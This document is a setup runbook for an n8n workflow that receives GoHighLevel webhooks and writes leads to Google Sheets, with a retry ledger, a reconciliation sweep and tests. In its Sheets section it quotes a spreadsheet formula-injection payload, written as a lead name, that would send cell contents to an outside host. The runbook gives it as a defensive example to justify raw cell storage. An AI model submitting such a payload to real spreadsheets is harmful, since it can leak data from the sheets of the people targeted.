# n8n and Google Sheets setup

Rebuildable checklist for the second half of the pipeline: GHL Opportunity →
GHL Outbound Webhook → n8n Cloud → Google Sheets.

Contains no secrets, no IDs, no URLs, and no real data. Every instance-specific
value is a placeholder you fill in through the UI.

## Why the payload contract is declared, not discovered

GoHighLevel's **free** `Webhook (Outbound)` workflow action sends a flat,
snake_case body. Its documented example shows contact fields, a nested
`location` object, and — when the workflow is triggered by an opportunity
event — a group of opportunity fields whose only bare `id` is unlabelled.

Building against that shape would mean building against a schema we cannot
version. So we do the opposite: **the payload contract is declared through
Custom Data**, and n8n reads *only* the keys we declared. GHL's native fields
still arrive; the workflow ignores every one of them.

That choice buys three things: the contract is explicit and reviewable, the
n8n allowlist has something stable to allowlist, and a schema change on GHL's
side cannot silently alter what we persist.

### Two corrections the vendor documentation got wrong

Both were established by reading a real captured delivery on 2026-08-09, not
by reasoning:

1. **Custom Data arrives nested under a `customData` object.** The vendor's
   documented example shows Custom Data keys flattened to the root alongside
   the native fields. They are not. Reading them from the root produced a
   permanent 401 and cost six diagnostic deliveries before the real body was
   inspected. The normalizer now reads `body.customData` and falls back to the
   root, so it survives either shape rather than betting on one.
2. **`contact_id` *does* exist at the root of the real payload**, despite
   being absent from the documented example. We still do not read it — the
   declared `customData.contactId` is the contract — but the claim that GHL
   sends no contact id is false, and any design resting on that premise is
   resting on nothing.

The general lesson, and the reason this section exists: **vendor documentation
is a hypothesis, and a captured payload is evidence.** Where they disagree,
the payload wins.

> **Gotcha: GHL misspells its own field.** The real payload carries
> `pipleline_stage`, not `pipeline_stage`. Anything reading GHL's native
> fields directly must reproduce the typo. This is a second, independent
> reason to read only the declared `customData` keys.

## Constraint that shapes everything downstream

The free action supports **no custom headers, no auth, and no signature**. The
Custom Webhook action that does is premium and billable. So the shared secret
travels **in the body**.

Two consequences, both load-bearing:

1. Any payload captured from a real delivery is **secret-bearing**. It must
   never be committed. `.gitignore` denies `payloads/*.local.json` and
   `payloads/captured*.json` for exactly this reason. The versioned fixture,
   [`payloads/ghl-opportunity-created.example.json`](../payloads/ghl-opportunity-created.example.json),
   carries a redacted placeholder instead.
2. Replay tooling injects the secret at send time —
   [`scripts/replay-webhook.ps1`](../scripts/replay-webhook.ps1) — and never
   prints, echoes, or persists it.

Ingress protection is therefore: **an unguessable path, plus a shared secret
in the body, validated before any write of any kind.** That is weaker than a
signature, and it is written down here rather than dressed up.

---

## 1. Google Sheet

One spreadsheet, three tabs, headers in row 1 exactly as below. Sharing stays
**private** — the sheet is reachable only through the bound n8n credential.

| Tab | Headers |
|---|---|
| `leads_backup` | `timestamp,eventId,correlationId,contactId,opportunityId,name,email,phone,business,service,source,stage,appointment,lastAction,status,attempt` |
| `run_log` | `timestamp,correlationId,eventId,contactId,opportunityId,workflow,step,status,attempt,error,outcome` |
| `needs_human` | `timestamp,correlationId,eventId,contactId,opportunityId,reason,status,owner,lastAction` |

`needs_human` is created now and **deliberately unused in this phase**. It is
the destination for TC-08 and TC-12 routing, which are not built yet. An empty
tab is honest; a tab quietly written to by nothing is not.

## 2. n8n credential

A single `Google Sheets OAuth2 API` credential, named
`GHL LeadFlow Demo — Google Sheets`, bound in the n8n credential store.

- Used **only** by the native Google Sheets node.
- Never reused in an HTTP Request node. Sending an OAuth token by hand through
  a generic HTTP node puts the token in node parameters, and node parameters
  appear in every export form.

## 3. n8n variable

Create one variable under **Settings → Variables**:

```
GHL_WEBHOOK_SHARED_SECRET
```

Its value is entered directly in the n8n UI and, separately, in the GHL
webhook action's Custom Data. It is never typed into a Code node, an export, a
commit, an Issue, a chat message, or a screenshot.

> **Plan constraint.** n8n documents Variables as available on *Self-hosted
> Enterprise and Pro Cloud* plans, which excludes Cloud Starter. The Cloud free
> trial is separately documented as granting "Pro features capped at 1000
> executions". Those two statements together imply the trial has Variables, but
> no single source says so — **verify it in the workspace before building.**
> If Variables are unavailable, see "Fallback" at the end of this document.

## 4. n8n Data Table — the ledger

Create a Data Table named `leadflow_event_ledger` with these columns:

| Column | Type | Meaning |
|---|---|---|
| `eventId` | String | `ghl:opportunity-created:<opportunityId>`. The dedup key. |
| `correlationId` | String | The delivery that most recently touched this row. |
| `opportunityId` | String | For reconciliation back into GHL. |
| `firstSeenAt` | String | ISO-8601. Set on first claim, never overwritten. |
| `status` | String | `claimed` \| `retry_scheduled` \| `completed` \| `failed` |
| `attempt` | Number | Incremented per **delivery** of the same `eventId`. |
| `backupAttempt` | Number | Incremented per **backup write attempt** inside one delivery. Added in P08. |
| `nextAttemptAt` | String | ISO-8601. When the scheduled retry is due. Cleared on completion. Added in P08. |
| `lastError` | String | Why the last attempt failed, truncated to 300 chars. Cleared on completion. Added in P08. |

**`attempt` and `backupAttempt` are not the same number and must not be
merged.** `attempt` counts how many times GHL delivered this event; it is what
makes a redelivery legible. `backupAttempt` counts how many times *we* tried
to write the backup for the current delivery; it is what the retry budget is
spent against. A single delivery that fails twice and then succeeds is
`attempt=1, backupAttempt=3`, and collapsing those into one column would make
"GHL sent it three times" indistinguishable from "we tried three times".

**Do not add an `updatedAt` column.** n8n Data Tables maintain `createdAt` and
`updatedAt` themselves; a user column of the same name is redundant and drifts
from the system value. The design originally specified one — the live table
proved it unnecessary, and the workflow no longer writes it.

The ledger is deliberately **separate from `run_log`**. `run_log` is an
append-only narrative for humans; the ledger is queried state that decides
control flow. Mixing them would mean a logging failure could change behaviour.

## 4b. n8n Data Table — the fault switch (P08)

Create a second Data Table named `leadflow_test_controls`:

| Column | Type | Meaning |
|---|---|---|
| `key` | String | Only `backup_fault` is used today. |
| `mode` | String | `off` \| `always`. Anything else means `off`. |
| `eventScope` | String | Empty arms every delivery. Otherwise only `eventId`s containing this substring fail. |
| `note` | String | Why it was flipped, for whoever finds it later. |

This is how TC-10, TC-11 and TC-12 make the downstream write fail on demand.
Three properties of it are deliberate.

**It is not a payload field, and never will be.** The obvious shortcut is a
`simulateFailure` flag in the webhook body. That would hand anyone who can
submit the public form both a denial-of-service lever and a way to push chosen
leads into the human-review queue. The switch lives where only an operator
with n8n access can reach it.

**It is append-only.** n8n's Data Table API exposes row insertion but no row
update, so flipping the switch means appending a new row; `Fault Gate` takes
the highest `id` for the key. That began as a constraint rather than a design
choice, and it turned out better than the mutable flag would have been — the
switch now carries its own history, so "who armed this, when, and why" is
answerable after the fact. The cost is a table that only grows.

**It fails open.** A missing row, an unreadable table, or an unrecognised
`mode` all resolve to `off`. A broken test switch must never be able to take
production down — the failure mode of a safety device has to be the safe one.

Leave it `off`. The last row appended during P08 says so explicitly.

## 5. Import the workflow

Import [`n8n/workflows/ghl-opportunity-to-sheets.sanitized.json`](../n8n/workflows/ghl-opportunity-to-sheets.sanitized.json).

The export is sanitized, so four things are placeholders and **must** be
re-picked in the UI after import. This is not import breakage — it is the
sanitization working:

| Placeholder | Where | What to do |
|---|---|---|
| `REPLACE_WITH_UNGUESSABLE_PATH` | `Webhook` node, `path` | Replace with a freshly generated UUID. Not a guessable word. |
| `REPLACE_WITH_SHEET_ID` | all 9 Google Sheets nodes | Pick the spreadsheet from the credential-backed dropdown. |
| `REPLACE_WITH_LEDGER_DATA_TABLE_ID` | the 4 ledger Data Table nodes | Pick `leadflow_event_ledger`. |
| `REPLACE_WITH_CONTROLS_DATA_TABLE_ID` | `Fault Gate: Read Control` | Pick `leadflow_test_controls`. |
| *(no credential bound)* | all 9 Google Sheets nodes | Select `GHL LeadFlow Demo — Google Sheets`. |

> **Do not drop `options.cellFormat: "RAW"` from any Sheets node.** The node
> defaults `cellFormat` to `USER_ENTERED`, which interprets a value exactly as
> if a person had typed it — so text beginning `=`, `+`, `-`, or `@` is stored
> as a **live formula**, not as text.
>
> That is reachable by an attacker who holds no secret at all. The lead form is
> public; a submitted name of `=IMAGE("https://…"&A1)` travels to GHL, GHL
> attaches the *correct* shared secret and delivers it, ingress authorises it
> legitimately, and the formula lands in the durable backup. `RAW` stores every
> value literally and closes it.

The export ships `RAW` on all eight nodes. Verify after import — a re-picked
node can silently reset its options.

> **`RAW` does not travel with the data.** It governs how Sheets *stores* the
> value, not how another program later *reads* it. Export `leads_backup` to CSV
> or XLSX and open it in Excel or LibreOffice and a leading `=`, `+`, `-`, or
> `@` is re-parsed as a formula at import time, no matter how it was stored.
> Anyone exporting this sheet must import the columns as text.

Then **Save and Activate**, and copy the **Production** webhook URL. The Test
URL expires after 120 seconds and will die mid-demo.

### Trap: saving a workflow does not change what production runs

n8n keeps a **draft** version and an **active** version. Editing and saving —
whether in the UI or through the API's update operation — writes the draft.
The production webhook keeps serving the previously **published** version
until you publish.

This cost real confidence during the P06 build. A security fix was applied and
verified by reading the workflow's nodes back through the API; the read
returned the *draft*, so the fix looked live. An execution more than an hour
later still ran the old code, which is the only reason it was caught.

Two rules follow:

- **Verify against the active version, not the workflow object.** Compare
  `activeVersionId` with the workflow's current `versionId`. If they differ,
  the change is not in production.
- **A test proves the version it ran against.** After publishing, any test
  whose evidence predates the publish covers the old artifact. Re-run enough
  of the suite to cover what changed.

### What the workflow does, in order

```
Webhook
  → Normalize and Authorize        allowlist + mint eventId/correlationId + compare secret
  → Authorized?          no  → Log Unauthorized  → 401
  → Payload Valid?       no  → Log Invalid       → 422
  → Ledger: Look Up Event
  → Ledger State
  → Already Completed?   yes → Log Duplicate     → 200 already_processed
                          no ↓
  → Ledger: Claim            (status=claimed, BEFORE any backup write)
  → Log Claim
  → Fault Gate: Read Control (operator-only failure switch; fails open)
  → Fault Gate
  → Sheets: leads_backup     (Append or Update, matched on eventId)
        ├─ ok    → Log Backup Written → Ledger: Complete → Log Processed
        │           → Response Already Sent?  yes → (end)
        │                                     no  → 200 processed
        └─ error → Retry Decision
                   → Ledger: Record Attempt Outcome
                   → Log Attempt Outcome
                   → Exhausted?
                        yes → Sheets: needs_human
                              → Exhausted Without Response?  yes → 500
                                                             no  → (end)
                        no  → First Failure?  yes → 202 retry_scheduled → Wait Before Retry
                                              no  →                       Wait Before Retry
                              → Wait Before Retry loops back to Fault Gate: Read Control
```

The loop back into `Fault Gate: Read Control`, rather than into
`Sheets: leads_backup`, is deliberate: the switch is re-read on every attempt,
which is the only reason a transient failure can *clear* between attempts.

### Response contract

| Situation | HTTP | Body `status` | `leads_backup` | `run_log` |
|---|---|---|---|---|
| Secret missing or wrong | 401 | `unauthorized` | zero new rows | exactly one row, `outcome=unauthorized` |
| Required field missing | 422 | `invalid_payload` | zero new rows | exactly one row, `outcome=invalid_payload`, naming the field |
| New event | 200 | `processed` | exactly one row | three rows, one `correlationId`, last `outcome=processed` |
| Event already completed | 200 | `already_processed` | unchanged | exactly one row, `outcome=duplicate_event`, **new** `correlationId` |
| Backup write failed, retries remain | **202** | `retry_scheduled` | unchanged for now | one row per failed attempt, `outcome=retry_scheduled`; ledger `retry_scheduled` with `nextAttemptAt` |
| Retry later succeeds | *(none — 202 already sent)* | — | exactly one row | `outcome=processed`; ledger `completed` |
| Retry budget exhausted | *(none — 202 already sent)* | — | zero rows | `outcome=retry_exhausted`; ledger `failed`; one `needs_human` row |

**The 500 became a 202, and that is a claim about ownership, not a cosmetic
change.** Before P08 a failed backup answered `500 failed`, which told GHL
"this did not work, it is your problem". That is now false: the workflow holds
a durable, scheduled retry and owns the outcome. `202 Accepted` says what is
actually true — the event is safe, the work is not finished, and nobody needs
to resend. The 500 still exists, but only for the degenerate configuration
where the budget is one attempt and there is therefore nothing to accept; with
`maxAttempts = 3` it is unreachable, and `Exhausted Without Response?` is the
guard that keeps exhaustion from answering a connection that was already
answered.

Two of these are deliberate and worth defending in an interview:

- **A duplicate answers 200, not 4xx.** A duplicate is our plumbing's artifact,
  not the sender's mistake. A 4xx makes senders retry harder or page someone,
  converting a non-event into an incident.
- **The unauthorized `run_log` row contains no caller-supplied value** — not
  the ids, not even the derived `eventId`. An unauthenticated caller must not
  be able to write attacker-chosen content into the audit log.

### 5b. The retry budget, and why these numbers (P08)

Every constant lives in one node, `Retry Decision`, and nothing else in the
workflow has an opinion about them:

| Constant | Value | Why |
|---|---|---|
| `MAX_ATTEMPTS` | 3 | One first attempt plus two retries. Bounded on purpose — an unbounded retry is just a slower way to lose the lead, because nobody is ever told. |
| `BASE_SECONDS` | 70 | See below. Not 30. |
| `FACTOR` | 2 | 70s then 140s. Exhausted after roughly 3.5 minutes. |
| jitter | `+0–20%`, additive only | See below. Not symmetric. |
| `CAP_SECONDS` | 300 | Stops the doubling from wandering into hours on a longer budget. |

**Two of those five are the interesting ones.**

`BASE_SECONDS` is 70 rather than a snappier 30 because of a specific n8n
behaviour: a `Wait` of **under 65 seconds is held in memory**, and only longer
waits are persisted to the database and resumed by the scheduler. A 30-second
first retry would therefore be the *only* attempt that did not survive a
restart of the instance — and a restart is exactly the kind of event that
causes the failure in the first place. Seventy seconds buys durability for the
whole ladder.

The **jitter is additive only** for the same reason. Symmetric jitter is the
textbook choice, and here it would be a bug: `70 × (1 − 0.2)` is 56 seconds,
which falls back under the 65-second line. Durability would then depend on a
coin flip per delivery. Adding 0–20% keeps the herd spread out without ever
dropping below the threshold.

Observed live, TC-12: 80s then 166s, terminal at 4 minutes 3 seconds.

**What is deliberately *not* built:** a separate retry-sweeper workflow polling
the ledger for due rows. The retry lives inside the original execution, held by
a durable `Wait`. That keeps one copy of the backup-write node — and `RAW` on
one node cannot drift out of sync with `RAW` on a second copy, which is a
failure this repository has already had once. The cost is honest and worth
naming: if an execution is lost while waiting, its ledger row stays
`retry_scheduled` forever and nothing re-drives it. The reconciliation sweep
below is the backstop for exactly that, and there is a real instance of it in
the ledger today — see "Known limitations".

### 5c. Manual replay of an exhausted event

A `failed` ledger row is not a dead end, and no new tooling was needed for it.
`Ledger State` only short-circuits on `completed`, so a `failed` or
`retry_scheduled` row is re-claimed and re-attempted on the next delivery of
the same `eventId`. Two ways to trigger that:

1. **Redeliver the captured payload** with
   [`scripts/replay-webhook.ps1`](../scripts/replay-webhook.ps1). Same
   `eventId`, fresh `correlationId`, full budget again. `leads_backup` is
   Append-or-Update on `eventId`, so a success after replay produces one row,
   not two.
2. **Let the reconciliation sweep find it**, if the payload was never captured.
   This only works when a real GHL Opportunity exists behind the event — see
   §5d.

Work the `needs_human` queue by `eventId`; the row carries the `correlationId`
of the delivery that gave up, which is the search key for the whole trail in
`run_log`.

**One caveat, learned the hard way during P08.** A ledger row reading `failed`
is *not* by itself proof that a human was told. During the first TC-12 run the
ledger went `failed` correctly while `Sheets: needs_human` errored on a
misconfiguration, so the terminal handoff never happened — a silent loss of
exactly the kind the test exists to catch, produced by the test itself. Ledger
row `id=7` still shows it. The handoff is only as good as the node that writes
it: check `needs_human`, not just the ledger.

### 5d. Reconciliation sweep — `LeadFlow Demo — Reconciliation Sweep`

Export: [`n8n/workflows/reconciliation-sweep.sanitized.json`](../n8n/workflows/reconciliation-sweep.sanitized.json).

No retry can rescue a webhook that never arrived, because there is nothing to
retry. The sweep is the only path that can notice an Opportunity GHL created
and n8n never heard about. It runs every 10 minutes and, for each recent
opportunity, recovers only those the **ledger has never seen**.

```
Every 10 Minutes
  → GHL: Recent Opportunities      GET /opportunities/search
  → Select Candidates              derive eventId, filter to a 24h lookback
  → One Candidate At A Time        batchSize 1
       → Ledger: Look Up Candidate
       → Missing From Ledger?
       → Needs Recovery?  no  → Already Known - Skip
                          yes → Sheets: leads_backup (Append or Update)
                                → Log Reconciled  (outcome=reconciled)
                                → Ledger: Record Recovery (status=completed)
```

Four design points, each of which is a way this could have been got wrong:

- **The `eventId` derivation is character-identical to the webhook path**
  (`ghl:opportunity-created:<opportunityId>`). If the two ever diverged, the
  sweep would "recover" events the ledger had already completed and write
  second rows. That one line is load-bearing.
- **A ledger row in *any* state means skip.** Not just `completed`:
  `claimed`, `retry_scheduled` and `failed` all belong to the retry loop, which
  owns them. The sweep must never race the retry loop for one event.
- **Safe to run twice**, by construction and twice over: the first run writes a
  `completed` ledger row that every later run sees, and the backup write is
  Append-or-Update on `eventId` regardless.
- **The 24-hour lookback is much wider than the 10-minute schedule.** A sweep
  that only looked back one interval would miss anything falling in a window
  where n8n itself was down — which is precisely when webhooks go missing.

**What the sweep recovers is thinner than what the webhook carries, and this is
recorded rather than hidden.** The opportunity search returns the contact's
name, email and phone, so those are real. `business` is left **empty** and
`service` is **derived** by splitting the Opportunity name on `" - "`. Both of
those live on contact custom fields that would need a second scope
(`contacts.readonly`) which the sweep does not have and did not ask for. A
recovered row says `lastAction=reconciled` so nobody mistakes it for a
first-class delivery. Adding the scope is a defensible upgrade; taking it
without saying why is not.

**Two things the sweep structurally cannot do**, both already known:

- It cannot see a suppressed **re-inquiry** (TC-03's scenario). No second
  Opportunity is created, so there is nothing for an opportunity-keyed sweep to
  find, and the existing Opportunity already has its row. A different and worse
  gap — see [`architecture.md`](architecture.md) §5.
- It cannot see an event whose Opportunity does not exist in GHL at all. The
  synthetic P08 test fixtures are in that category by design.

#### Credential — read-only Private Integration

The sweep is **built and not activated**, because it has no credential yet, and
the reason is worth stating precisely rather than as "we need a token".

The GoHighLevel access this project uses everywhere else is an **OAuth grant
held by the Claude Code MCP client**. The token lives in that client's own
store, bound to that client's `client_id`/`client_secret`, and refreshing it
requires those same credentials. Nothing in this repository holds it —
`.mcp.json` is gitignored and carries only an endpoint URL, and the n8n MCP
entries carry a URL and no headers or environment at all. n8n is a different
OAuth client entirely and has no path to that token. **An MCP session is not a
runtime credential**, and treating it as one is the mistake this note exists to
prevent.

What n8n needs instead is its own credential. For a single sub-account the
proportionate choice is a **Private Integration Token**:

| Item | Value |
|---|---|
| Scope | `opportunities.readonly` — and nothing else |
| Endpoint | `GET https://services.leadconnectorhq.com/opportunities/search` |
| Headers | `Authorization: Bearer <token>`, `Version: 2021-07-28`, `Accept: application/json` |
| n8n credential type | **Header Auth**, name `Authorization`, value `Bearer <token>` |

One scope is enough because the search response embeds
`opportunities[].contact.{name,email,phone}` directly; no second call and no
`contacts.readonly` is required for what the sweep writes.

**Never paste the token into chat, a shell, a commit, an Issue, an export, or a
screenshot.** Create it in the GHL location's Settings → Private Integrations
and type it straight into the n8n credential.

> **One parameter in that node is unverified.** The location is currently sent
> as `location_id`. It has never been confirmed against a live `200`, because
> no credential has existed to make the call. Confirm it on the first
> credentialed run before trusting the node — the alternative spelling is
> `locationId`, and the node carries a note saying so.

## 6. GHL workflow — `LeadFlow Demo — Opportunity to n8n`

A **separate** workflow from `LeadFlow Demo — Form to Opportunity`, so a
manually created or reconciled Opportunity fires the webhook too.

1. **Trigger:** `Opportunity Created`, filtered to pipeline
   `LeadFlow Demo Pipeline` and stage `New Lead`.
2. **Speed-to-lead action:** an **internal task or notification only**. No SMS,
   no email, no premium/billable action. The demo must not send real messages.
3. **Action:** `Webhook (Outbound)` — the free one. Method `POST`, URL = the
   n8n **Production** URL.
4. **Custom Data:** the declared contract below.
5. **Publish** the workflow.

### Custom Data — the declared payload contract

| Key | Value |
|---|---|
| `sharedSecret` | the shared secret, typed directly (static text) |
| `eventType` | `opportunity.created` (static text) |
| `contactId` | Contact Id — **from the merge-field picker** |
| `opportunityId` | Opportunity Id — **from the merge-field picker** |
| `name` | contact full name — picker |
| `email` | contact email — picker |
| `phone` | contact phone — picker |
| `business` | contact company/business name — picker |
| `service` | `Service Interest` custom field (`contact.service_interest`) — picker |
| `source` | opportunity source — picker |
| `stage` | pipeline stage — picker |

These eleven keys arrive **nested under `customData`** in the delivered body,
not at the root — see "Two corrections the vendor documentation got wrong"
above. The replay script's `-SecretKey` therefore defaults to the dotted path
`customData.sharedSecret`.

> **Gotcha, already paid for once in P05.** Merge values must be inserted from
> GHL's **merge-field picker**, never typed as the placeholder text the picker
> displays. Typing `[Opportunity Id]` by hand produces a payload whose value is
> literally that bracket text. P05 hit this on the `Create Opportunity` action's
> Name field — see [`ghl-setup.md`](ghl-setup.md).
>
> The first real delivery is the only thing that proves the tags resolved.
> Inspect the n8n execution body before declaring TC-01 anything.

### Capturing a payload safely

Read the body from the **n8n execution view**, not from a third-party echo
service. Sending this payload to a public request-bin would publish the shared
secret to a host we do not control.

To keep a captured payload for replay, save it as `payloads/captured.local.json`
— already gitignored — and redact the secret before it goes anywhere else.

**It must be the complete HTTP request body and valid JSON on its own.** A
fragment hand-copied out of the n8n UI — starting at `"body": {`, or with
unbalanced braces — is not replayable, and the replay script rejects it rather
than sending something that would test nothing. Prefer downloading the item
JSON over selecting text in the browser, or read the execution through the n8n
API. Verify before relying on it:

```powershell
Get-Content payloads\captured.local.json -Raw | ConvertFrom-Json | Out-Null
```

## 7. Tests

| Test | Procedure |
|---|---|
| TC-01 | Submit a **new, fictional** lead through the live form. |
| TC-02 | Redeliver the exact captured payload: `.\scripts\replay-webhook.ps1 -PayloadPath payloads\captured.local.json`. **Do not resubmit the form** — that re-tests TC-02b, and no webhook would fire at all. **Corrected P07:** the reason is now the `Find Opportunity` split in `Form to Opportunity`, which routes a contact with an open opportunity down the re-inquiry branch and never reaches `Create Opportunity`. It is not the duplicate-opportunity guard — that guard has never been exercised. |
| TC-18 | Same payload, `-Mode NoSecret` and again `-Mode WrongSecret`. |
| TC-09 | Harness fixture carrying `opportunityId` and `contactId` but neither `email` nor `phone`. Expect `422 {"status":"invalid_payload","missing":"email_or_phone"}`. |
| TC-10 / TC-11 | Append `mode=always, eventScope=<fixture prefix>` to `leadflow_test_controls`, send the fixture, observe `202`, then append `mode=off` **before** `nextAttemptAt` falls due. |
| TC-12 | Same, but leave it armed past the budget — roughly 4 minutes. |

Evidence required before any of these is marked `PASS` is enumerated in
[`../TEST_CASES.md`](../TEST_CASES.md). A status code alone proves nothing
about downstream state.

### The internal test harness (P08)

TC-09 through TC-12 need an *authorized* delivery, and the shared secret is
deliberately not available outside n8n. Two internal, manual-trigger-only
workflows solve that without weakening anything:

| Workflow | What it does |
|---|---|
| `LeadFlow Demo — P08 Test Sender (internal)` | A `Fixture` Code node builds the body **without** the secret; the HTTP node injects `$vars.GHL_WEBHOOK_SHARED_SECRET` in its own expression at send time and POSTs to the production webhook. Export: [`p08-test-sender.sanitized.json`](../n8n/workflows/p08-test-sender.sanitized.json). |
| `LeadFlow Demo — P08 Evidence Reader (internal)` | Reads `leads_backup`, `run_log`, `needs_human`, the ledger and the fault switch, so downstream state can be observed without a browser session. Five read nodes off a manual trigger; not exported, because rebuilding it is quicker than importing it. |

The secret never enters an item and is therefore never persisted in execution
data — the same discipline that removed the secret-length diagnostic in P06.
Neither workflow has a webhook or form trigger, so neither adds a public
surface: they are reachable only by someone who already has n8n access, and
therefore already has the variable.

Fixtures use synthetic `opportunityId`s prefixed `p08-`, which is what lets
`eventScope` arm the fault for one test without touching any other delivery.
They also mean these events have **no matching GHL Opportunity** — see the
limitation below.

## 8. Troubleshooting: every delivery returns 401

The secret check fails closed on purpose — an unset variable must never
authorize a request:

```js
const secretConfigured = expected.length > 0;
const authorized = secretConfigured && provided === expected;
```

That means **a missing or misnamed n8n variable and a genuine value mismatch
produce the identical 401**. Observed live during the P06 build: the GHL leg
worked, merge tags resolved, the webhook fired, and n8n rejected every
delivery.

Diagnose in this order:

1. **Variable key, character-exact.** `Settings → Variables` must show
   `GHL_WEBHOOK_SHARED_SECRET` — uppercase, underscores, no prefix, no typo.
   A key that differs by one character produces a permanent 401 that looks
   exactly like a wrong password. Check this first; it costs five seconds and
   it is the highest-probability cause.
2. **No quotes, no wrapper.** In GHL's Custom Data the `sharedSecret` row must
   be *static text*. Typing `"value"` with quotes stores the quotes; the
   comparison trims whitespace but does not strip quote characters.
3. **Re-enter the value in both places** rather than trying to compare them by
   eye. Never paste either one into chat, a commit, an Issue, or a screenshot.

The `run_log` row for a rejection carries
`n8n variable resolved: true|false`, which separates cause 1 from cause 3
without exposing the secret or even its length.

## 9. Known limitations of this build

- **Not exactly-once.** A crash between the `leads_backup` write and the ledger
  reaching `completed` leaves a stale `claimed` row. A redelivery then does not
  short-circuit — it re-enters the claim branch. The `Append or Update` on
  `eventId` means it updates the same backup row instead of adding a second,
  which bounds the damage but does not eliminate the window. A claim timeout or
  a transactional store would; both are `[LATER]`.
- **Sequential evidence only.** TC-02 is a sequential redelivery. It is not
  evidence about concurrent deliveries, and must never be described as such.
- **Three Sheets writes on the happy path** — one per real stage boundary,
  plus the backup write. That costs latency in exchange for a `run_log` that
  still shows where a failed run stopped. Batching all three at the end would
  be faster and would log nothing when it mattered.
- **String comparison of the secret is not constant-time.** Over TLS, against a
  network attacker, this is not a practical exposure; it is noted rather than
  claimed to be absent.
- **A rejected request still causes one write.** "Validated before any write"
  means before any *business* write — `leads_backup`, the ledger, and GHL are
  all untouched by an unauthenticated caller. But the rejection itself appends
  a `run_log` row, so anyone who learns the webhook path can append rows
  without knowing the secret, growing the sheet and consuming Google API
  quota. Two things bound the damage: the path is an unguessable UUID, and the
  row contains **no caller-supplied value**, so it cannot be used for log
  injection. It is a deliberate trade — an unlogged rejection is invisible,
  and TC-18 is judged on that row existing. Rate limiting at the edge is the
  real fix and is `[LATER]`.
- **A retry that dies mid-wait is not re-driven.** The retry lives inside the
  original execution. If that execution is lost — crashed, cancelled,
  deleted — its ledger row stays `retry_scheduled` with a `nextAttemptAt` in
  the past and nothing picks it up. **There is a live instance in the ledger
  right now:** row `id=5`, `ghl:opportunity-created:p08-tc10-transient`, left
  behind by a P08 execution that died on a defect in the retry branch before
  that defect was fixed. It is left in place rather than quietly cleaned,
  because it is the honest shape of this limitation. A sweeper over the ledger
  would close it and is `[LATER]`; the reconciliation sweep does **not**,
  because it keys on GHL opportunities and this `opportunityId` is synthetic.
- **A `failed` ledger row is not proof a human was told.** The terminal
  `needs_human` write is a separate node and can fail on its own. Ledger row
  `id=7` is exactly that case. Judge the handoff on the `needs_human` row.
- **P08 fixtures now sit in `leads_backup` and the ledger.** `p08-regress-alpha`
  and `p08-tc10b-transient` have backup rows; `p08-tc12-persistent` and
  `p08-tc12b-persistent` are terminal `failed`. All are fictional and all carry
  `source = P08 Internal Test Harness`, which is the column to filter on before
  a demo walkthrough.
- **`Retry Decision` reads `$('Retry Decision').first()` from its own
  downstream nodes.** Within a loop iteration n8n resolves that to the current
  run, which is what makes the attempt counter correct — verified live across
  three attempts in TC-12. It is not, however, a documented guarantee, and a
  future n8n release could change the resolution rule. If the retry ladder ever
  starts repeating attempt 1, this is the first thing to check.

## Fallback — if n8n Variables are unavailable on the plan

Do **not** inline the secret into a Code node: it would land in every export
form, and this repository is public.

Preferred fallback, in order:

1. **A credential-bound value.** Create a `Header Auth` credential whose value
   is the shared secret and reference it from a node that consumes credentials.
   Credential values are stored encrypted and are excluded from normal exports.
2. **A one-row n8n Data Table** holding the expected secret, read at the start
   of the run. Weaker — it puts the secret in queryable application data — but
   it keeps it out of the workflow definition.

Both are worse than a Variable. If neither is available, stop and re-scope the
ingress protection rather than shipping a workflow with a literal secret.

## Related

- [`ghl-setup.md`](ghl-setup.md) — the GHL side of this pipeline
- [`architecture.md`](architecture.md) §6 — identity and idempotency
- [`decisions/ADR-002-idempotency-strategy.md`](decisions/ADR-002-idempotency-strategy.md) — why the ledger is ordered the way it is
- [`integration-options.md`](integration-options.md) §3–4 — hosting decision
